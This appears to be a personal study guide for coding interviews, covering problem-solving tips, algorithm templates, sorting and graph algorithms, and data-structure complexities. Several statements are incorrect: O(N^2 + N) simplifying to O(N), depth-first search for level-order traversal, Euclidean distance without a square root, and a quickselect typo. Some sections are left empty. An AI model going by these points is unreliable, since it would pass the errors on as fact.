1. Interview Tips:

- Scoping the problem like this
Come up with clarifying examples and expected outputs, clarify function signature
Ask performance questions up front (space vs. time requirements)
  Generally, to improve the speed of a program, we can choose to either use an appropriate data structure or algorithm, or to use more memory.
Validate inputs first
State assumptions up front
How big is the size of the input?
How big is the range of values?
What kind of values are there? Are there negative numbers? Floating points? Will there be empty inputs?
Are there duplicates within the input?
What are some extreme cases of the input?
How is the input stored? If you are given a dictionary of words, is it a list of strings or a trie?

- Write edge cases and tests already for debugging after it is done

- Have pseudocode to help guide you but ultimately show them real code

- Work through from brute force to optimal solution, explaining time and space complexity and types of algorithms
and data structures you would use along the way

- Emphasis on solving it and then iterating upon it and compare solutions for time and space complexity tradeoffs

- Say test cases with edge boundaries considered, think about optimizing big picture, ask questions if you don't know about API or how things work

Follow up
- How would you handle the problem if the whole input is too large to fit into memory? 
How would you handle the input arriving as a stream? 
The answer is usually a divide-and-conquer approach — perform distributed processing of the data and only read certain 
chunks of the input from disk into memory, write the output back to disk and combine them later.

Stuck?
- Consider all data structures like hashmap, set, stack, etc. and see if you can apply it to the problem by using more memory to save time
- Use the brute force approach and repeated work as guide for optimizing it further; consider various algorithm approaches like greedy, recursive, graph traversal,
sorting, searching, etc.
- Implement pure helper functions to help like isAlphaNumeric(), isValidRow/Col, etc.
- Code optimistically - say you already have these functions implemented based on your algorithm, use them in your code and implement them later if within time constraint

Tips and Tricks

Sequences i.e. arrays and strings
  are there duplicates and would they affect the answer?
  check for out of bounds
  be mindful about slicing and concatenating as they usually take O(n) time
  use start and end to demarcate subarray or substring as much as possible
  sliding window technique/two pointers
  when given two sequences to process, great to have two indices to go through it like merging two sorted arrays
  corner cases:
    empty sequence
    sequence with 1 or 2 elements
    sequence with repeated elements
  
Arrays
  is it sorted or partially sorted? if yes, some sort of binary search is possible and looking for solution faster than O(N)
  can you sort array and simplify problem? make sure order of elements does not need to be preserved before sorting
  summation or multiplication is involved -> pre-computation using hashing or a prefix, suffix sum, or product might be useful
  if asking for O(1) space, might be possible to use array itself as hashtable
    i.e. if values only from 1 to N where N is length of array, negate value of that index to indicate presence of that number

Binary
  test kth bit is set
    num & (1 << k) != 0
  set kth bit
    num |= (1 << k)
  turn off kth bit
    num &= ~(1 << k)
  toggle the kth bit
    num ^= (1 << k)
  to check if a number is a power of 2
    num & num - 1 == 0
  corner cases
    check for overflow/underflow
    negative numbers

Dynamic Programming
  to optimize space, sometimes you don't have to store entire DP table in memory but only need last two rows or values of matrix

Geometry
  Euclidean distance between two pairs of points
    dx^2 + dy^2
  To find two circles overlap, check that distance between two centers of circles is less than sum of their radii

Graph
  Given list of edges, build your own graph to traverse
    adjacency matrix, adjacency list,  hashmap of hashmaps
  handle cycles and keep a set of visited nodes when traversing
  Breadth first search and depth first search
  topological sort, Dijkstra's algorithm
  graphs commonly represented as 2D matrices and each cell can traverse to its adjacent cells (up, left, down, right)
  when recursively traversing matrix, always ensure that next position is within boundary of matrix
  corner cases:
    empty graph
    graph with one or two nodes
    disjoint graphs
    graphs with cycles
  
  Template for DFS on matrix:
  def traverse(matrix):
    rows, cols = len(matrix), len(matrix[0])
    visited = set()
    (Right, Left, Down, Up)
    directions = ((0, 1), (0, -1), (1, 0), (-1, 0))
    def dfs(i, j):
      if (i, j) in visited:
        return
      visited.add((i, j))
      # Traverse neighbors
      for direction in directions:
        next_i, next_j = i + direction[0], j + direction[1]
        if 0 <= next_i < rows and 0 <= next_j < cols: # Check boundary
          # Add any other checking here ^
          dfs(next_i, next_j)
    for i in range(rows):
      for j in range(cols):
        dfs(i, j)
    
    def dfs(self, i, j, matrix, visited, m, n):
      if visited: 
        # return or return a value
      for dir in self.directions:
        x, y = i + direction[0], j + direction[1]
            if x < 0 or x >= m or y < 0 or y >= n or matrix[x][y] <= matrix[i][j] (or a condition you want to skip this round):
              continue
            # do something like
            visited[i][j] = True
            # explore the next level like
            self.dfs(x, y, matrix, visited, m, n)

Intervals
  questions that give an array of two-element arrays with two values representing a start and end value
  i.e. [[1,2], [4,7]]
  tricky due to number of cases in which they overlap
  clarify whether [1,2], [2,3] are considered overlapping intervals
  common routine is to sort array of intervals by the start value of each interval
  be familiar with code to check if two intervals overlap and to merge overlapping intervals
  def is_overlap(a, b):
    return a[0] < b[1] and b[0] < a[1]
  def merge_overlapping_intervals(a, b):
    return [min(a[0], b[0]), max(a[1], b[1])]
  corner cases
    single interval
    non-overlapping intervals
    an interval totally consumed within another interval
    duplicate intervals

Linked List
  represent sequential data
  insertion and deletion of code anywhere is O(1); arrays have to be shifted O(N)
  adding dummy node at head and/or tail might help to handle any edge cases where operations have to be performed at head or tail
    helps with removing conditional code to deal with null pointers
  some can be solved without additional storage like reversing linked list
  for deletion, you can either modify the node values or change the node pointers, might need to keep reference to previous element
  for partitioning linked lists, create two separate linked lists and join them back together
  two pointers also common
    getting kth from last node by having two pointers where on is k ahead of the other; when other node reaches end, the earlier one is k nodes from end
    detecting cycles: have two pointers where on increments twice as fast as the other; if the two pointers meet there is a cycle
    getting middle node: one pointer increments twice as fast as other, when faster node reaches the end of list, slower node will be in middle
  count number of nodes in linked list
  reverse linked list in place
  find middle node of linked list using fast or slow pointers
  merge two lists together
  corner cases
    single node
    two nodes
    clarify cycles

Math
  if code involves division or modulo, remember to check division/modulo by 0
  when question involves multiple of a number, modulo might be useful
  check for and handle overflow and underflow - mention it is possible and how to handle it
  consider negative and floating point numbers
  if the question asks to implement an operator such as power, squareroot, or division and it is faster than O(N), binary search is usually approach
  common formulas
    sum of 1 to N = (n+1)*n / 2
    sum of GP = 2^0 + ... + 2^N = 2^(N+1) - 1
    permutations of N = N!/(N-K)!
    combinations of N = N!/(K! * (N-K)!)
  corner cases
    division by 0
    integer overflow and underflow

Matrix
  2D array, usually related to graph traversal or dynamic programming
    typically make a copy of matrix with same dimensions that are initialized to empty values and use these to store 
    the visited state or the dynamic programming table
    i.e. filling up a matrix
    rows, cols = len(matrix), len(matrix[0])
    copy = [[0 for _ in range(cols)] for _ in range(rows)
  verify winning condition of games
    i.e. vertically and horizontally like for tictactoe
    one trick is to write code to verify horizontal cells, then transpose matrix and reuse logic for horizontal verification to verify originally vertical cells
  corner cases
    empty matrix
    1 x 1 matrix
    matrix with only one row or column

Recursion
  useful for permutation, know how to generate all permutations of a sequence as well as how to handle duplicates
  always define a base case for recursion to end
  implicitly uses stack and can be rewritten iteratively using stack
  recursion level may go too deep and cause stack overflow
  will never be O(1) space complexity because stack is involved unless there is tail call optimization

String
  ask about input character set and case sensitivity
  i.e. usually lowercase Latin letters from a to z
  when you need to compare strings where the order isn't important like anagram, you may use hashmap as a counter
  if you need to keep a counter of characters, space complexity is O(1) because upper bound is range of characters which is fixed
  at 26 characters for lowercase Latin letters
  common data structures to look up strings efficiently: trie/prefix tree, suffix tree
  common string algorithms
    Rabin Karp - efficient searches of substrings using a rolling hash
    KMP - efficient searches of substrings, longest proper prefix suffix
  non-repeating characters - use a 26-bit bitmask to indicate which lowercase Latin letters are inside the string
    mask = 0
    for c in set(word):
      mask |= (1 << (ord(c) - ord('a')))
    to determine if two strings have common characters, perform & on two bitmasks
      if result is non-zero, mask_a & mask_b > 0, then the two strings have common characters
  anagram = result of re-arranging letters of a word or phrase to produce a new word or phrase while using all original letters once
    to determine if two stirngs are anagrams:
      sorting both strings should return same resulting string O(NlogN) time O(logN) space
      if we map each character to a prime number and multiply each mapped number together, anagrams should have same multiple (prime factor decomposition)
      O(N) time and O(1) space
      frequency counting of characters O(N) time O(1) space
  palindrome = word, phrase or number or other sequence of characters that reads same backward and forward
    reverse string and it should be equal to itself
    have two pointers at start and end of string, move inward until they meet and at any point in time, the characters at both pointers should match
    when counting number of palindromes, can have two pointers that move outward, away from middle
    can be even or odd length -> for each middle pivot position, you need to check it twice: once with character and once without the character
      for substrings you can terminate early if no match
      for subsequences, use dynamic programming as there are overlapping subproblems
  corner cases
    empty string
    single-character string
    strings with only one distinct character

  sliding window substring
    1. Use two pointers: start and end to represent a window.
    2. Move end to find a valid window.
    3. When a valid window is found, move start to find a smaller window.
    string minWindow(string s, string t) {
      unordered_map<char, int> m;
      // Statistic for count of char in t
      for (auto c : t) m[c]++;
      // counter represents the number of chars of t to be found in s.
      size_t start = 0, end = 0, counter = t.size(), minStart = 0, minLen = INT_MAX;
      size_t size = s.size();
      
      // Move end to find a valid window.
      while (end < size) {
        // If char in s exists in t, decrease counter
        if (m[s[end]] > 0)
          counter--;
        // Decrease m[s[end]]. If char does not exist in t, m[s[end]] will be negative.
        m[s[end]]--;
        end++;
        // When we found a valid window, move start to find smaller window.
        while (counter == 0) {
          if (end - start < minLen) {
            minStart = start;
            minLen = end - start;
          }
          m[s[start]]++;
          // When char exists in t, increase counter.
          if (m[s[start]] > 0)
            counter++;
          start++;
        }
      }
      if (minLen != INT_MAX)
        return s.substr(minStart, minLen);
      return "";
    }

Tree
  undirected and connected acyclic graph
  try using recursion when you can use subtree to solve solution, recursive function may need to return two values
  traversing a tree by level, use depth first search
  ask whether nodes can be negative if dealing with summation
  pre-order, in-order, post-order traversal recursively -> though they may ask for iterative approach
  binary tree: inorder traversal is insufficient to uniquely serialize a tree; pre-order/post-order also required
  binary search tree
    in-order traversal of BST will give you all elements in order
    validate that binary tree is BST with in-order traversal
    usually looking for solutions faster than O(N)
  corner cases
    empty tree
    single node
    two nodes
    very skewed tree like linked list
  
  O(N) to go through all N nodes in tree
  preorder traversal - for copy of tree or get prefix expression on expression tree
    if null return
    visit root
    traverse left subtree (i.e. preorder(left-subtree))
    traverse right subtree (i.e. preorder(right-subtree))
  
  postorder traversal - to delete tree
    if null return
    traverse left subtree (i.e. postorder(left-subtree))
    traverse right subtree (i.e. postorder(right-subtree))
    visit root
  
  inorder traversal - to validate BST, output all numbers in ascending order
    if null return
    traverse left subtree
    visit root
    traverse right subtree
  
  levelorder traversal - breadth first traversal of tree
    printLevelorder(tree)
    for d = 1 to height(tree)
      printGivenLevel(tree, d);

    // recursive function to print all nodes at given livel
    printGivenLevel(tree, level)
    if tree is NULL then return;
    if level is 1, then
        print(tree->data);
    else if level greater than 1, then
        printGivenLevel(tree->left, level-1);
        printGivenLevel(tree->right, level-1);

Tries
  prefix trees that make searching and storing strings more efficient
  i.e. for autocomplete, searches
  preprocessing dictionary of words into a list with word of length k, among n words leads to O(k) searching rather than O(nk)
  implement add, remove, search methods
  can possibly save time using linked list instead because a lot of spots in character array are empty

Heaps
  if you see a top or lowest k mentioned in question, can possibly use heap to solve problem like top K frequent elements
  if you require top k elements, use minheap of size k; iterate through each element, pushing it into heap
    whenever heap size exceeds k, remove minimum element to guarantee you have k largest elements
  binary tree with two special properties: must have all nodes in specific order and shape must be complete (left-most nodes filled always)
  can have duplicate values, not a BST; ordering of parent nodes compared to children

2. Algorithms and Big O Complexity:

Understanding big O notation
  - language we use for talking about how long an algorithm takes to run (asymptotic analysis)
  - express runtime in terms of how quickly it grows relative to the input as as the input gets arbitrarily large
  i.e. O(1) constant time, like one step
  function printFirstItem(arrayOfItems) {
    console.log(arrayOfItems[0]);
  }
  i.e. O(N) linear time where n is the number of items in the array
  function printAllItems(arrayOfItems) {
    arrayOfItems.forEach(function(item) {
      console.log(item);
    });
  }
  i.e. O(N^2) quadratic time outer loop runs n time and our inner loop runs n times for each iteration of the outer loop
  function printAllPossibleOrderedPairs(arrayOfItems) {
    arrayOfItems.forEach(function(firstItem) {
      arrayOfItems.forEach(function(secondItem) {
        console.log(firstItem, secondItem);
      });
    });
  }
  - N can be the actual input or the size of the input
  - throw out the constants i.e. O(2N) => O(N)
  - drop less significant terms i.e. O(N^2 + N) => O(N)
  - usually talking about the worst case
  - optimizing for space complexity: using less memory, we look at the total size (relative to size of input) of any new variables we're allocating
  - usually we're talking about additional space so we don't include space taken up by the inputs
  - discuss tradeoffs between time and space complexity, readability and easier implementation can also play a factor and some constant performance boosts
  can be important even though big O tells you to ignore constants as input gets arbitrarily large
  i.e. O(1) space
  function sayHiNTimes(n) {
    for (var i = 0; i < n; i++) {
      console.log('hi');
    }
  }
  i.e. O(N) space
  function arrayOfHiNTimes(n) {
    var hiArray = [];
    for (var i = 0; i < n; i++) {
      hiArray[i] = 'hi';
    }
    return hiArray;
  }


Sorting
- QuickSort
  divide and conquer algorithm, picks an element as a pivot and partitions the given array around the picked pivot
  i.e. variations like always pick first element as pivot, always pick last element as pivot, pick random element as pivot, pick median as pivot
  key process is partition(): should place an element x as pivot in its correct position in a sorted array
    and put all smaller elements than x before x and all greater elements than x after x which should be done in linear time
-> preferred because it is an in-place sort and doesn't require any extra storage
-> practical versions use randomized version to avoid worst case for sorted array
-> cache friendly with good locality of reference when used for arrays, tail recursive and tail call optimizations can be done
-> prefer this over merge sort when dealing with arrays
-> General Algorithm
// start from leftmost element and keep track of index of smaller/equal elements as i; while traversing if we find a smaller element, we swap
// current element with arr[i]; otherwise we ignore current element
quicksort(arr, low, high)
  if (low < high) {
    // pi is partitioning index, arr[pi] is now at right place
    pi = partition(arr, low, high);

    quickSort(arr, low, pi-1);    // before pi
    quickSort(arr,, pi + 1, high) // after pi
  }

// takes last element as pivot, places pivot element at correct position in sorted array and places all smaller than pivot to left
// and all greater elements to right of pivot
partition(arr, low, high) {
  // pivot (element to be placed at right position)
  pivot = arr[high];
  
  // Index of smaller element
  i = (low - 1)

  for (j = low; j <= high - 1; j++) {
    // If current element is smaller than or equal to pivot
    if (arr[j] <= pivot) {
      i++; // increment index of smaller element
      swap arr[i] and arr[j]
    }
  }
  swap arr[i+1] and arr[high]
  return i+1
}
-> Stable: no
-> Time Complexity:
  Best Case: O(Nlog(N)) - when always picking the middle elemnt as pivot
  Worst Case: O(N^2) - when always picking greatest or smallest element as pivot like when array is already sorted
  Average Case: O(Nlog(N)) - its inner loop can be efficiently implemented in most architectures, can change choice of pivot so worst case rarely occurs
  Space Complexity: O(1)

- Similar QuickSelect: selection algorithm to find kth smallest/max element in unordered list
-> General algorithm
  - instead of recurring for both sides after finding the pivot, it recurs only for the part that contains
  the k-th element
  i.e. for kth smallest element, if index of partitioned elelement is more than k, we recur for left part
  if index is same as k, we found the kth smallest element
  if index is less than k, we recur for the right part

function quickSelect(list, left, right, k) 
  if left = right
    return list[left]
  
  select a pivotIndex between left and right

  pivotIndex = partition(list, left, right, pivotIndex)

  if k = pivotIndex
    return list[k]
  else if pivotIndex > k
    // go left
    right = pivotIndex - 1
  else
    // go right
    left = pivotIndex = 1
-> Time Complexity: reduced expected complexity from O(NlogN) to O(N) with worst case of O(N^2)

MergeSort
-> divide and conquer algorithm, continuously divides array in to two halves, recurses on
both the left subarray and right subarray and then merges the two sorted halves
-> generally considered better when data is huge and stored in external storage, needs O(N) extra storage though
-> has to deal with allocating and de-allocating extra space of merged array results
-> merge sort preferred for linked lists as nodes are not adjacent in memory, can insert items in middle in O(1) extra space and O(1) time
-> merge operations can be implemented without extra space for linked lists, must travel from head to ith node to reach something and overhead of partitioning
increases for quicksort
-> merge sort accesses data sequentially and need of random access is low
-> General Algorithm
  divides input array in two halves, calls itself for the two halves and then merges the two sorted halves
  merge() to merge two halves - merge(arr, l, m, r), assumes arr[l...m] and arr[m+1...r] are two sortred sub-arrays

// Keeps dividing array in half until size becomes 1 and then starts merging arrays back
MergeSort(arr, left, right) 
  if right > left
    1. Find middle point to divide array into two halves
      mid = (left + right) / 2
    2. Call mergeSort for first half
      call mergeSort(arr, left, mid)
    3. Call merge sort for second half
      call mergeSort(arr, mid+1, right)
    4. Merge the two halves sorted in step 2 and 3
      call merge(arr, left, mid, right)

merge(arr, left, mid, right)
  n1 = mid - left + 1
  n2 = right - mid
  create l[n1] and r[n2]

  copy data into left and right arrays
  l[i] = arr[left + i]
  r[j] = arr[mid + 1 + j]

  i = 0;
  j = 0;
  k = left
  while i < n1 and j < n2
    if (l[i] <= r[j])
      arr[k] = l[i]
      i++
    else
      arr[k] = r[j]
      j++
    k++

  // Copy remaining elements of l[] if there are any
  // Copy remaining elements of r[] if there are any

-> Stable: yes
  Time Complexity:  
  Best Case: O(Nlog(N))
  Worst Case: O(Nlog(N))
  Average Case: O(Nlog(N))
  Space Complexity: O(N)

BucketSort
-> distributes elements of an array in to a number of buckets, each buck is then sortred individually either using
a different sorting algorithm or by recursively applying the bucket sorting algorithm
-> Time Complexity:
  Best Case: O(N + K)
  Worst Case: O(N^2)
  Average Case: O(N + K)

HeapSort
-> General Algorithm
---
-> Time Complexity

Insertion Sort

Radix Sort
-> like bucket sort, distributes elements of an array into a number of buckets; differs from bucket sort by 're-bucketing' the array
after the initial pass as opposed to sorting each bucket and merging
-> General Algorithm
-> Time Complexity:
  Best Case: O(NK)
  Worst Case: O(NK)
  Average Case: O(NK)

Topological Sort
-> linear ordering of a directed graph's nodes such that for every edge node from node u to node v, u comes before v in the ordering
-> for Directed Acyclic Graph (DAG) is a linear ordering of vertices such that for every directed edge uv, vertex u comes before v in the ordering
-> topological sort is not possible if the graph is not a DAG as there will be a cycle
-> can be more than one topsorting for a graph
-> first vertex in topological sorting is always a vertex with in-degree as 0 (vertex with no incoming edges)
-> DFS: print vertex and recursively call DFS for adjacent vertices vs. topological sort: print vertex before its adjacent vertices
-> use a temporary stack, don't print vertex immediately but call topological sort for all adjacent vertices
and then push it to a stack (a vertex is only pushed to stack only when all of its adjacent vertices and their adjacent vertices and so on) are already in stack
-> used for scheduling jobs, just DFS with extra stack
-> general algorithm:
  - need a boolean visited array, stack to hold all the vertices
  topologicalSort() {
    initialize stack
    mark all vertices as not visited
    sort starting from all vertices one by one as long as they are unvisited
    // recursive function: mark the current node as visited
    // recur for all vertices adjacent to this vertex that are not visited
    // push current vertex to stack which stores results
    print out stack results display topologically sorted vertices
  }
  DFS method:
  L ← Empty list that will contain the sorted nodes
  while there are unmarked nodes do
      select an unmarked node n
      visit(n) 
  
  function visit(node n)
    if n has a permanent mark then return
    if n has a temporary mark then stop (not a DAG)
    mark n temporarily
    for each node m with an edge from n to m do
        visit(m)
    mark n permanently
    add n to head of L
  
  Kahn's Algorithm: find a list of start nodes which have no incoming edges and insert them into a set S;
  at least one such node must exist in a non-empty acyclic graph
  L ← Empty list that will contain the sorted elements
  S ← Set of all nodes with no incoming edge
  while S is non-empty do
      remove a node n from S
      add n to tail of L
      for each node m with an edge e from n to m do
          remove edge e from the graph
          if m has no other incoming edges then
              insert m into S
  if graph has edges then
      return error (graph has at least one cycle)
  else 
      return L (a topologically sorted order)

-> Time Complexity: O(|V| + |E|)

- Divide and Conquer
  Divides a problem into simpler versions of itself and then applies solution on smaller subproblems to larger problem itself
  Often combines answers to subproblems like merging elements together upon recursion and sorting
  i.e. MergeSort

- Binary Search
-> General Algorithm
  Search a sorted array by repeatedly dividing the search interval in half. 
  Begin with an interval covering the whole array. 
  If the value of the search key is less than the item in the middle of the interval, 
    narrow the interval to the lower half. 
  Otherwise narrow it to the upper half. 
  Repeatedly check until the value is found or the interval is empty.
-> Time Complexity: O(log(N)) if data is sorted

- Dynamic Programming and Memoization
  Focusing on optimization, always choosing best possible element at any given time
  Exhaustively search through all possible subproblems and then choose best solution from that
  Memoization to not recompute sub-problems more than once, storing values in memory
  1. Identify sub-problem in words
  2. Write out sub-problem as recurring mathematical decision
    What decision do I make at every step?
    If my algorithm is at step i, what information would it need to decide what to do in step i + 1 (and what it needs to do in step i - 1)?
    i.e. OPT(i) = max(v_i + OPT(next[i]), OPT(i+1))
  3. Solve original problem using steps 1 and 2
    i.e. OPT(1)
  4. Determine the dimensions of the memoization array and the direction in which it should be filled
    See if the solution depends upon solutions in range above or below it i.e. OPT(N)...OPT(2), OPT(1)
    Dimensions of array equal to number and size of variables on which OPT(*) relies i.e. one dimensional if depending on variable i in OPT(i)
      i.e. memo = [OPT(1), OPT(2), OPT(3)] though we can create it like this to match up with indices [0, OPT(1), OPT(2), OPT(3)]
  5. Code it and figure out base cases

  Top down DP
    start with large, complex problem and understand how to break it down into smaller subproblems, memoizing the problem into parts

  Bottom up DP
    starts with smallest possible subproblems, figures out a solution to them, and then slowly builds itself up to solve the larger, more complicated subproblem
    can save only say the last two values rather than all previous values -> O(1) space

  Runtime:
    pre-processing
    how many times the for loop runs
    how much time it takes recurrence to run in one for loop iteration
    post-processing

    Pre-processing + Loop * Recurrence + Post-processing

- Greedy 
-> they choose the best possible option in the moment, which is often referred to as the “greedy choice”; local heuristic
i.e. Dijkstra's
-> make locally optimal choices at each step in the hope of eventually reaching the globally optimal solution
-> need two properties:
  optimal substructure: optimal solution to the problem contains optimal solutions to the given problem's subproblems
  greedy property: optimal solution is reached by "greedily" choosing the locally optimal choice without ever considering previous choices
i.e. Coin change: given target amount of V cents and list of denominations of coins, what is minimum number of coins we must use to represent V?
-> continuously selecting largest coin denomination less than or equal to V, subtract that coin's value from V, and repeat
i.e. Prim's Algorithm -> finds minimum spanning tree for a weighted undirected graph
-> finds subset of edges that forms a tree that includes every node in graph
-> O(|V|^2)
i.e. Kruskal's Algorithm -> finds minimum spanning tree in a graph, graph does not have to be connected
-> O(|E|log|V|)

- Recursion (and backtracking)
  To use recursion: problem can be broken down into smaller problems of same type, problem has some base cases, base case is reached before stack size limit exceeds
  Backtracking: we attempt solving a subproblem, and if we don't reach the desired solution, then undo whatever we did for solving that subproblem, and try solving another subproblem
    typically has exponential time behavior
    can prune branches of tree early on


- Breadth first search
-> visiting sibling/neighbor nodes before children nodes, uses queue
1. Add a node/vertex from the graph to a queue of nodes to be “visited”.
2. Visit the topmost node in the queue, and mark it as such.
3. If that node has any neighbors, check to see if they have been “visited” or not.
4. Add any neighboring nodes that still need to be “visited” to the queue.
5. Remove the node we’ve visited from the queue.
-> if we backtrack from a node and follow one of its parents until we reach the main parent node, we will have found one of shortest paths
to that node which will be equivalent to the level of that node
-> General Algorithm
  for graphs, there may be cycles so we may come to the same node again -> can use a boolean visited array 
  function bfs(start) {
    Mark all vertices as not visited (visited boolean array)
    Create a queue for BFS
    Mark the current node as visited and enqueue it
    while the queue is not empty
      dequeue a vertex from the queue and print it
      get all adjacent vertices of the dequeued vertex s
        if an adjacent vertex has not been visited
          mark it as visited and enqueue it
  }
-> can use a queue (FIFO) structure to help
-> graph traversal algorithm which explores the neighbor nodes first, before moving to the next level neighbors
-> Time Complexity: O(|V| + |E|)

- Depth first search
-> can determine whether two nodes x and y have a path between them by looking at the children of the starting node and recursively
  determining if path exists
-> BFS traverses one level of children at a time and may use more memory -> shortest path; DFS traverses down a single path, one child node at a time -> tells us if even a path exists
and could be longest path
-> i.e. solving a maze and backtracking when we hit a dead end - recursion
-> graph traversal: choose arbitrary node to start traversal and don't repeat any nodes by marking vertex as visited("breadcrumbs")
-> runtime depends on size of adjacency list - linear time
-> General Algorithm
    for graphs, there may be cycles so we may come to the same node again -> can use a boolean visited array 
    function dfs(start) {
      Mark all vertices as not visited (boolean array)
      Push start vertex onto stack and set the visited[start] to be true
      while vertex is not empty
        pop vertex from top of the stack
        get all adjacent vertices of popped vertex s
          if an adjacent vertex has not been visited
            mark it as visited and push onto stack
    }
-> can use a stack (LIFO) structure to help 
-> graph traversal algorithm which explores as far as possible along each branch before backtracking
-> Time Complexity: O(|V| + |E|)

- Dijkstra
-> Problem: Given a graph and a source vertex in graph, find shortest paths from source to all vertices in the given graph
-> General Algorithm
  create a shortest path tree set that keeps track of vertices included in shortest path tree whose minimum distance
    from source is calculated and finalized; initially, this is empty
  assign a distance value to all vertices in input graph, initialize all values as infinite, initialize source vertex distance as 0 to start from
  while sptSet doesn't include all vertices
    pick vertex u which is not in sptSet and has minimum distance value
    include u to sptSet
    update distance value of all adjacent vertices to u
      must iterate through all adjacent vertices and for every adjacent vertex v, if sum of distance value u from source and weight of
      edge u-v is less than distance value of v, then update distance value of v
-> algorithm to find shortest path between nodes in a graph
-> best for one source to all destinations like BFS for unweighted graphs, dijkstra for weighted graphs without negative weights, and
Bellman Ford for weighted graphs with negative weights
-> Time Complexity: O(|V|^2)
  O(V) space to hold all vertices


- Bellman-Ford Algorithm
-> General Algorithm
-> computes shortest paths from single source node to all other nodes in a weighted graphs, slower than Djikstra's but more
versatile in handling graphs in which some of edge weights are negative numbers
-> Time Complexity: O(|E|) vs. worst case O(|V||E|)

- Floyd-Warshall Algorithm
-> finding shortest paths in a weighted graph with positive or negative edge weights but no negative cycles
-> single execution will find lengths (summed weights) of shortest paths between all pairs of nodes
-> great if trying to find between every pair of nodes
-> Time Complexity: O(|V|^3)

- A*
-> Problem: for path-finding/graph traversal and approximate shortest path even with obstacles in way in 2D grid
-> pick a node according to an f value based on movement cost, g, to get from starting point to given square on grid and estimated
movement cost, h, to move from that given square on grid to final destination
-> need an open and closed list, can use Manhattan/Euclidean/Diagonal Distance for heuristics
-> General Algorithm
  initialize open list
  initialize closed list
  put starting node on open list and can leave its parameter f as zero

  while open list is not empty
    find a node with least f on open list called q
    pop q off open list
    generate q's 8 successors and set their parents to q
    for each successor
      if successor is the goal, stop search
      successor.g = q.g + distance between successor and q
      successor.h = distance from goal to successor
      successor.f = successor.g + successor.h

      if a node with same position as successor is in open list which has a lower f than
      successor, skip this successor

      if a node with a same position as successor is in the closed list which has a lower f than successor, skip this successor
      otherwise add node to open list
    
    push q onto closed list
-> Time Complexity:
  - best to use when there is only one source and one destination
  O(E) to go through all edges in graph
  O(V) auxiliary space where V is number of vertices

- KMP: Knuth Morris Pratt Algorithm (Pattern Searching)
-> Problem: Given text and pattern, print out all occurrences of pattern in text
-> Naive string matching: slide pattern over text one by one and check for a match; if a match is found then slide by 1 again
to check for subsequent matches
Algorithm:
  loop from i=0 to i <= N - M
    // for current index i, check for pattern match
    loop through from j=0 to j < M
      if txt[i+j] != pat[j]
        break
    if j == M
      print out le pattern
-> Improves upon naive string matching (O(m(n-m+1))) by having a window to compare the last character of pattern with last character of current text
to decide whether the string matches or not, allows us to skip matching other earlier characteristic
-> Idea: uses degenerating property (patterns having same sub-patterns appearing more than once in pattern)
-> whenever we detect a mismatch after some matches, we already know some of the characters in the text of the next window
-> needs preprocessing in say an integer array that tells us the count of the characters to be skipped - called lps, same size m of pattern to help us skip characters while matching
-> lps indicates longest proper prefix which is also a suffix of pattern, will be used to not match character that we know will not match anyways
-> Algorithm:
-> keep matching characters and incrementing i and j while pat[j] and txt[i] match
-> when we see a mismatch, don't need to match lps[j-1] characters with txt[i-j...i-1], change only the j value to be lps[j-1]
-> if we match more and j === m (size of pattern), print pattern and reset j to lps[j-1] (moving window forward)
-> to compute LPS: 
We initialize lps[0] and len as 0. 
If pat[len] and pat[i] match, we increment len by 1 and assign the incremented value to lps[i] and increment i
If pat[i] and pat[len] do not match and len is not 0, we update len to lps[len-1] and do not increment i
If pat[i] and pat[len] do not match and len is 0, we update lps[i] = 0 and increment i
-> given LPS array:
set i index to 0 for text and j index to 0 for pattern
while i is less than string length N
  if pat[j] and txt[i] match, increment i and j
  if j equals the length of pattern M, print the pattern and set j to lps[j-1]
  else if there is a mismatch after j matches (i < N and pat[i] != txt[j])
    if j does not equal zero
      do not match earlier characters and set j to lps[j-1]
    else 
      increment i
-> Time Complexity: O(N)

- Bitmasks
-> technique used to perform operations at the bit level, leads to faster runtime complexity and helps limit memory usage
-> test kth bit - s & (1 << k)
-> set kth bit - s |= (1 << k)
-> turn off kth bit - s &= ~(1 << k)
-> toggle kth bit - s ^= (1 << k)
-> multiply by 2^n - s << n
-> divide by 2^n - s >> n
-> intersection: s & t
-> union: s | t
-> set subtraction: s & ~t
-> extract lowest set bit: s & (-s)
-> extract lowest unset bit: ~s & (s + 1)
-> swap values: x ^= y; y ^= x; x ^= y;

3. Data Structures and Big O Complexity
- Arrays:
-> Time Complexity:
  Access: O(1)
  Search: O(N)
  Insert: depends but O(N) if between two elements to shift everything over
  Remove: depends but O(N) if from middle to shift everything over

- Linked List: linear collection of data elements called nodes each pointing to the next node by means of a pointer
-> group of nodes which represent a sequence
-> singly-linked list - each node points to next node and last node points to null
-> doubly-linked list - each node has two pointers, prev and next, last node's next pointer points to null
-> circular-linked list - each node points to next node and last node points back to first node
-> Time Complexity:
  Access: O(N)
  Search: O(N)
  Insert: O(1)
  Remove: O(1)

- Stack: collection of elements with two principle operations, push (add to collection) and pop (removes most recently added element)
-> Last in, first out (LIFO)
-> Time Complexity:
  Access: O(N)
  Search: O(N)
  Insert: O(1)
  Remove: O(1)

- Queue: collection of elements with two principle operations, enqueue (inserts an element into queue) and dequeue (removes element from queue)
-> First in, first out (FIFO)
-> Time Complexity:
  Access: O(N)
  Search: O(N)
  Insert: O(1)
  Remove: O(1)

- Tree: undirected, connected, acyclic graph
  To tell whether a graph is a valid tree, we have to make sure there is no cycle in the graph (acyclic)
  and make sure every node is reached (connected)
    -> edges.length === n - 1, where n is number of nodes in graph
    -> to test cyclic, can make an array for each node as array index and array will store parent of node as array index;
    every time we fetch a new pair of nodes, we trace the root node (deepest parent node of two nodes) and if they have same root,
    then there is a cycle; otherwise we set parent of second node to be first node
    -> if we know there is no cycle, we just check if there are enough edges to make it connected (edges.length === n - 1)

- Binary Tree: tree in which each node has at most two children referred to as left and right child
-> Full Tree: tree in which every node has either 0 or 2 children
-> Perfect Binary Tree: all interior nodes have two children and all leaves have the same depth
-> Complete Tree: every level except possibly the last is full and all nodes in the last level are as far left as possible

- Binary Search Tree (BST): value in each node must be greater than or equal to any value stored in left subtree and less than or equal to any value stored in the
right subtree
-> Time Complexity:
  Access: O(log(N))
  Search: O(log(N))
  Insert: O(log(N))
  Remove: O(log(N))

- Trie: radix or prefix tree, search tree used to store a dynamic set or associative array where the keys are usually strings
-> no node in the tree stores the key associated with that node but the position in tree defines the key with which it is associated
-> all descendants of a node have a common prefix of string associated with that node and root is associated with empty string
-> empty root with links to other nodes, one for each possible alphabetic value
